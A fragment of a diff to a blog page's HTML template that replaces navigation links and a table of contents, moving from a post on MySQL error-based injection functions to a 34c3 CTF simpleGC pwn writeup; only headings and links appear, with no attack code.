-            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2016/04/08/0x18/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/01/17/0x40/" title="34c3 ctf simpleGC writeup">http://0x48.pw/2018/01/17/0x40/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2018/01/17/0x40/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="//qn.lazysheep.cc/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -353,16 +441,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2016/04/17/0x19/">
-                    How old are Crypto?
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2016/04/04/0x17/">
-                    Python 使用dpkt分析数据包
+                <a href="/2018/01/16/0x41/">
+                    Pwn学习之house of系列(一)
                 </a>
             </div>
         
@@ -373,7 +455,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#使用updatexml"><span class="toc-number">1.</span> <span class="toc-text">使用updatexml</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用ExtractValue"><span class="toc-number">2.</span> <span class="toc-text">使用ExtractValue()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用name-const"><span class="toc-number">3.</span> <span class="toc-text">使用name_const</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用exp报错"><span class="toc-number">4.</span> <span class="toc-text">利用exp报错</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用floor报错"><span class="toc-number">5.</span> <span class="toc-text">利用floor报错</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用join报错"><span class="toc-number">6.</span> <span class="toc-text">利用join报错</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#部署调试环境"><span class="toc-number">1.</span> <span class="toc-text">部署调试环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#分析漏洞"><span class="toc-number">2.</span> <span class="toc-text">分析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sub-40131B函数"><span class="toc-number">2.1.</span> <span class="toc-text">sub_40131B函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sub-4011c4函数"><span class="toc-number">2.2.</span> <span class="toc-text">sub_4011c4函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用"><span class="toc-number">3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li></ol>
 </div>
 <style>
     .left-col .switch-btn {
@@ -424,15 +506,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2016/04/17/0x19/" title="上一篇: How old are Crypto?">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2016/04/04/0x17/" title="下一篇: Python 使用dpkt分析数据包">
+            <a href="/2018/01/16/0x41/" title="下一篇: Pwn学习之house of系列(一)">
                 <i class="fa fa-angle-right"></i>
             </a>
         
